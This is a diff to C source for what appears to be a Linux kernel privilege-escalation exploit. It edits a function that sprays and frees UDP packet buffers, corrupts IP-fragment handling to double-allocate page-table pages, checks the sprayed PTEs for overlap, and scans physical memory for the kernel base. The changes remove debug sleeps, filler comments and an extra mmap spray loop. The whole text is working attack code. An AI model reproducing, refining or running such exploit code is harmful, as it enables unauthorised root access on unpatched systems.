@@ -311,7 +311,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	{
 		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
 		alloc_ipv4_udp(1);
-		//i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i*i;
 	}
 
 	// allocate and free 1 skb from freelist
@@ -325,9 +324,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	{
 		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
 		recv_ipv4_udp(1);
-		if (i == 60){
-			sleep(2);
-		}
 	}
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
@@ -346,14 +342,10 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// causes end == offset in ip_frag_queue(). packet will be empty
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
-	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
-	void *_pmd_area1[20];
-	for (int i=4; i < 24; i++){
-		_pmd_area1[i] = mmap((void*)PTI_TO_VIRT(1, i, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-		*(unsigned long long*)_pmd_area1[i] = 0xCAFEBABA;
-	}
+
 	// allocate overlapping PMD page (overlaps with PTE)
-	sleep(2);
+	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
+
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
 	// find overlapped PTE area
@@ -361,7 +353,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
-		//i*i*i*i*i*i*i*i*i*i*i;
+
 		// pte entry pte[0] should be the PFN+flags for &_pmd_area
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
@@ -395,6 +387,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
 	{
 		unsigned long long kernel_iteration_base;
+
 		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);
 
 		PRINTF_VERBOSE("[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
@@ -407,6 +400,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		for (unsigned long long j=0; j < 512; j++) 
 		{
 			unsigned long long phys_kernel_base;
+		
 			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
 			// - this "kernel base" is actually the assembly bytecode of start_64() and variants
 			// - it's different per architecture and per compiler (clang produces different signature than gcc)
